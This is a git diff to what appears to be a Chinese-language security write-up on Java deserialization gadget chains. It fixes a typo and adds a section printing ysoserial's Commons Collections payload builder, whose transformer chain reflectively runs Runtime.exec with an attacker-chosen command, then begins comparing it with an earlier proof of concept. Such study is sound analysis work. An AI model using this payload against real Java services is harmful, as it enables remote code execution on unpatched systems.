@@ -744,7 +744,54 @@ innerMap.put("value", "xxxx");
  }
 ```
 
-可以看到我们本来触发漏洞的memberValue.setValue被删除了，而且注意到`Map<String, Object> mv = new LinkedHashMap<>();/*......*/mv.put(name, value);`不再直接 使用反序列化得到的Map对象，而是新建了一个LinkedHashMap对象，并将原来的键值添加进去，我们精心构造的Map不在执行一些操作，自然也不会触发漏洞。
+可以看到我们本来触发漏洞的memberValue.setValue被删除了，而且注意到`Map<String, Object> mv = new LinkedHashMap<>();/*......*/mv.put(name, value);`不再直接 使用反序列化得到的Map对象，而是新建了一个LinkedHashMap对象，并将原来的键值添加进去，我们精心构造的Map不再执行一些操作，自然也不会触发漏洞。
 
 #### ysoserial的利用链分析
+
+这里先给出ysoserial构造的poc，ysoserial的代码将一些操作封装成了函数，为了方便分析，我这里将它们展开
+
+```java
+public InvocationHandler getObject(final String command) throws Exception {
+		final String[] execArgs = new String[] { command };
+		// inert chain for setup
+		final Transformer transformerChain = new ChainedTransformer(
+			new Transformer[]{ new ConstantTransformer(1) });
+		// real chain for after setup
+		final Transformer[] transformers = new Transformer[] {
+				new ConstantTransformer(Runtime.class),
+				new InvokerTransformer("getMethod", new Class[] {
+					String.class, Class[].class }, new Object[] {
+					"getRuntime", new Class[0] }),
+				new InvokerTransformer("invoke", new Class[] {
+					Object.class, Object[].class }, new Object[] {
+					null, new Object[0] }),
+				new InvokerTransformer("exec",
+					new Class[] { String.class }, execArgs),
+				new ConstantTransformer(1) };
+
+		final Map innerMap = new HashMap();
+
+		final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
+
+		final Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);
+
+		final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);
+
+		Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain
+
+		return handler;
+	}
+```
+
+这与我们之前的poc代码有一些不同，主要是三点：
+
+* 之前的poc代码中，` Transformer transformerChain = new ChainedTransformer(transformers);`，在利用链条上，transformerChain遍历调用transformers数组的transform方法，触发了漏洞。但是此处的poc没有将transformers作为new ChainedTransformer的参数传入，那么`Reflections.setFieldValue(transformerChain, "iTransformers", transformers);`是否能起到类似的效果，如果可以，为什么要这么构造？
+* 没有发现我们熟悉的`TransformedMap.decorate`，而有一个`LazyMap.decorate`
+* 没有使用反射获取`AnnotationInvocationHandler`，而是增加了一些其他操作
+
+让我们一点一点来分析
+
+##### 问题1
+
+
 
